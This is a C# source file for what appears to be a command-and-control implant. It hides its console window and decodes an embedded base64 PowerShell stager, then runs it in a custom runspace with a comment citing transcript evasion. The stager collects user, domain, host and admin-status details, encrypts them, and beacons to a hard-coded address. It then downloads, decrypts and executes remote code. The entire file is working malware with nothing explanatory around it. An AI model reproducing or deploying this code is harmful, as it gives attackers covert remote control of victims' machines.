using System;
using System.Text;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

public class Program
{
    [DllImport("kernel32.dll")] static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")] static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("kernel32.dll")] static extern IntPtr GetCurrentThread();
    [DllImport("kernel32.dll")] static extern bool TerminateThread(IntPtr hThread, uint dwExitCode);

    public static IntPtr DllBaseAddress = IntPtr.Zero;
    public const int SW_HIDE = 0;
    public const int SW_SHOW = 5;
    public static string basepayload = "W1N5c3RlbS5OZXQuU2VydmljZVBvaW50TWFuYWdlcl06OlNlcnZlckNlcnRpZmljYXRlVmFsaWRhdGlvbkNhbGxiYWNrID0geyR0cnVlfQokZGY9QCgiIikKJGg9IiIKJHNjPSIiCiR1cmxzPUAoImh0dHBzOi8vMTAuMC4yLjE1OjQ0MyIpCiRjdXJsPSIvdnNzZi93cHBvL3NpdGUvYmdyb3VwL3Zpc2l0b3IvIgokcz0kdXJsc1swXQpmdW5jdGlvbiBDQU0gKCRrZXksJElWKXsKdHJ5IHskYSA9IE5ldy1PYmplY3QgIlN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuUmlqbmRhZWxNYW5hZ2VkIgp9IGNhdGNoIHskYSA9IE5ldy1PYmplY3QgIlN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuQWVzQ3J5cHRvU2VydmljZVByb3ZpZGVyIn0KJGEuTW9kZSA9IFtTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LkNpcGhlck1vZGVdOjpDQkMKJGEuUGFkZGluZyA9IFtTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LlBhZGRpbmdNb2RlXTo6WmVyb3MKJGEuQmxvY2tTaXplID0gMTI4CiRhLktleVNpemUgPSAyNTYKaWYgKCRJVikKewppZiAoJElWLmdldFR5cGUoKS5OYW1lIC1lcSAiU3RyaW5nIikKeyRhLklWID0gW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygkSVYpfQplbHNlCnskYS5JViA9ICRJVn0KfQppZiAoJGtleSkKewppZiAoJGtleS5nZXRUeXBlKCkuTmFtZSAtZXEgIlN0cmluZyIpCnskYS5LZXkgPSBbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRrZXkpfQplbHNlCnskYS5LZXkgPSAka2V5fQp9CiRhfQpmdW5jdGlvbiBFTkMgKCRrZXksJHVuKXsKJGIgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCR1bikKJGEgPSBDQU0gJGtleQokZSA9ICRhLkNyZWF0ZUVuY3J5cHRvcigpCiRmID0gJGUuVHJhbnNmb3JtRmluYWxCbG9jaygkYiwgMCwgJGIuTGVuZ3RoKQpbYnl0ZVtdXSAkcCA9ICRhLklWICsgJGYKW1N5c3RlbS5Db252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoJHApCn0KZnVuY3Rpb24gREVDICgka2V5LCRlbmMpewokYiA9IFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJGVuYykKJElWID0gJGJbMC4uMTVdCiRhID0gQ0FNICRrZXkgJElWCiRkID0gJGEuQ3JlYXRlRGVjcnlwdG9yKCkKJHUgPSAkZC5UcmFuc2Zvcm1GaW5hbEJsb2NrKCRiLCAxNiwgJGIuTGVuZ3RoIC0gMTYpCltTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoJHUpLlRyaW0oW2NoYXJdMCkpKX0KZnVuY3Rpb24gR2V0LVdlYmNsaWVudCAoJENvb2tpZSkgewokZCA9IChHZXQtRGF0ZSAtRm9ybWF0ICJ5eXl5LU1NLWRkIik7CiRkID0gW2RhdGV0aW1lXTo6UGFyc2VFeGFjdCgkZCwieXl5eS1NTS1kZCIsJG51bGwpOwokayA9IFtkYXRldGltZV06OlBhcnNlRXhhY3QoIjI5OTktMTItMDEiLCJ5eXl5LU1NLWRkIiwkbnVsbCk7CmlmICgkayAtbHQgJGQpIHtleGl0fQokdXNlcm5hbWUgPSAiIgokcGFzc3dvcmQgPSAiIgokcHJveHl1cmwgPSAiIgokd2MgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50OwoKaWYgKCRoIC1hbmQgKCgkcHN2ZXJzaW9udGFibGUuQ0xSVmVyc2lvbi5NYWpvciAtZ3QgMikpKSB7JHdjLkhlYWRlcnMuQWRkKCJIb3N0IiwkaCl9CmVsc2VpZigkaCl7JHNjcmlwdDpzPSJodHRwczovLyQoJGgpL3Zzc2Yvd3Bwby9zaXRlL2Jncm91cC92aXNpdG9yLyI7JHNjcmlwdDpzYz0iaHR0cHM6Ly8kKCRoKSJ9CiR3Yy5IZWFkZXJzLkFkZCgiVXNlci1BZ2VudCIsIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS84MC4wLjM5ODcuMTIyIFNhZmFyaS81MzcuMzYiKQokd2MuSGVhZGVycy5BZGQoIlJlZmVyZXIiLCIiKQppZiAoJHByb3h5dXJsKSB7CiR3cCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJQcm94eSgkcHJveHl1cmwsJHRydWUpOwppZiAoJHVzZXJuYW1lIC1hbmQgJHBhc3N3b3JkKSB7CiRQU1MgPSBDb252ZXJ0VG8tU2VjdXJlU3RyaW5nICRwYXNzd29yZCAtQXNQbGFpblRleHQgLUZvcmNlOwokZ2V0Y3JlZHMgPSBuZXctb2JqZWN0IHN5c3RlbS5tYW5hZ2VtZW50LmF1dG9tYXRpb24uUFNDcmVkZW50aWFsICR1c2VybmFtZSwkUFNTOwokd3AuQ3JlZGVudGlhbHMgPSAkZ2V0Y3JlZHM7Cn0gZWxzZSB7ICR3Yy5Vc2VEZWZhdWx0Q3JlZGVudGlhbHMgPSAkdHJ1ZTsgfQokd2MuUHJveHkgPSAkd3A7IH0gZWxzZSB7CiR3Yy5Vc2VEZWZhdWx0Q3JlZGVudGlhbHMgPSAkdHJ1ZTsKJHdjLlByb3h5LkNyZWRlbnRpYWxzID0gJHdjLkNyZWRlbnRpYWxzOwp9IGlmICgkY29va2llKSB7ICR3Yy5IZWFkZXJzLkFkZChbU3lzdGVtLk5ldC5IdHRwUmVxdWVzdEhlYWRlcl06OkNvb2tpZSwgIlNlc3Npb25JRD0kQ29va2llIikgfQokd2N9CmZ1bmN0aW9uIHByaW1lcm4oJHVybCwkdXJpLCRkZikgewokc2NyaXB0OnM9JHVybCskdXJpCiRzY3JpcHQ6c2M9JHVybAokc2NyaXB0Omg9JGRmCiRjdSA9IFtTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eV06OkdldEN1cnJlbnQoKQokd3AgPSBOZXctT2JqZWN0IFN5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwuV2luZG93c1ByaW5jaXBhbCgkY3UpCiRhZyA9IFtTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NCdWlsdEluUm9sZV06OkFkbWluaXN0cmF0b3IKJHByb2NuYW1lID0gKEdldC1Qcm9jZXNzIC1pZCAkcGlkKS5Qcm9jZXNzTmFtZQppZiAoJHdwLklzSW5Sb2xlKCRhZykpeyRlbD0iKiJ9ZWxzZXskZWw9IiJ9CnRyeXskdT0oJGN1KS5uYW1lKyRlbH0gY2F0Y2h7aWYgKCRlbnY6dXNlcm5hbWUgLWVxICIkKCRlbnY6Y29tcHV0ZXJuYW1lKSQiKXt9ZWxzZXskdT0kZW52OnVzZXJuYW1lfX0KJG89IiRlbnY6dXNlcmRvbWFpbjskdTskZW52OmNvbXB1dGVybmFtZTskZW52OlBST0NFU1NPUl9BUkNISVRFQ1RVUkU7JHBpZDskcHJvY25hbWU7MSIKdHJ5IHskcHA9ZW5jIC1rZXkgVEVrRDFnc0pReXJJeTVzdE1JOEc0cVpRemxTckNyRnZ2MzZhSENGdXdxUT0gLXVuICRvfSBjYXRjaCB7JHBwPSJFUlJPUiJ9CiRwcmltZXJuID0gKEdldC1XZWJjbGllbnQgLUNvb2tpZSAkcHApLmRvd25sb2Fkc3RyaW5nKCRzY3JpcHQ6cykKJHAgPSBkZWMgLWtleSBURWtEMWdzSlF5ckl5NXN0TUk4RzRxWlF6bFNyQ3JGdnYzNmFIQ0Z1d3FRPSAtZW5jICRwcmltZXJuCmlmICgkcCAtbGlrZSAiKmtleSoiKSB7JHB8IGlleH0KfQpmdW5jdGlvbiBwcmltZXJzIHsKaWYoIVtzdHJpbmddOjpJc051bGxPckVtcHR5KCIiKSAtYW5kICFbRW52aXJvbm1lbnRdOjpVc2VyRG9tYWluTmFtZS5Db250YWlucygiIikpCnsKICAgIHJldHVybjsKfQpmb3JlYWNoKCR1cmwgaW4gJHVybHMpewokaW5kZXggPSBbYXJyYXldOjpJbmRleE9mKCR1cmxzLCAkdXJsKQp0cnkge3ByaW1lcm4gJHVybCAkY3VybCAkZGZbJGluZGV4XX0gY2F0Y2gge3dyaXRlLW91dHB1dCAkZXJyb3JbMF19fX0KJGxpbWl0PTMwCmlmKCR0cnVlKXsKICAgICR3YWl0ID0gNjAKICAgIHdoaWxlKCR0cnVlIC1hbmQgJGxpbWl0IC1ndCAwKXsKICAgICAgICAkbGltaXQgPSAkbGltaXQgLTE7CiAgICAgICAgcHJpbWVycwogICAgICAgIFN0YXJ0LVNsZWVwICR3YWl0CiAgICAgICAgJHdhaXQgPSAkd2FpdCAqIDI7CiAgICB9Cn0KZWxzZQp7CiAgICBwcmltZXJzCn0K";

    public Program() {
        try
        {
            string tt = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String(basepayload));
            InvokeAutomation(tt);
        }
        catch
        {
            Main();
        }
    }
    public static string InvokeAutomation(string cmd)
    {
        Runspace newrunspace = RunspaceFactory.CreateRunspace();
        newrunspace.Open();

        // transcript evasion
        RunspaceInvoke scriptInvoker = new RunspaceInvoke(newrunspace);
        var cmdin = new System.Management.Automation.PSVariable("c");
        newrunspace.SessionStateProxy.PSVariable.Set(cmdin);
        var output = new System.Management.Automation.PSVariable("o");
        newrunspace.SessionStateProxy.PSVariable.Set(output);

        Pipeline pipeline = newrunspace.CreatePipeline();
        newrunspace.SessionStateProxy.SetVariable("c", cmd);
        pipeline.Commands.AddScript("$o = IEX $c | Out-String");
        Collection<PSObject> results = pipeline.Invoke();
        newrunspace.Close();

        StringBuilder stringBuilder = new StringBuilder();
        foreach (PSObject obj in results)
        {
            stringBuilder.Append(obj);
        }
        return stringBuilder.ToString().Trim();
    }
    public static void Sharp(long baseAddr=0)
    {
        DllBaseAddress = new IntPtr(baseAddr);
        var handle = GetConsoleWindow();
        ShowWindow(handle, SW_HIDE);
        try
        {
            string cmd = Encoding.UTF8.GetString(System.Convert.FromBase64String(basepayload));
            InvokeAutomation(cmd);
        }
        catch { }
        var x = GetCurrentThread();
        TerminateThread(x, 0);

    }
    public static void Main()
    {
        Sharp();
    }
}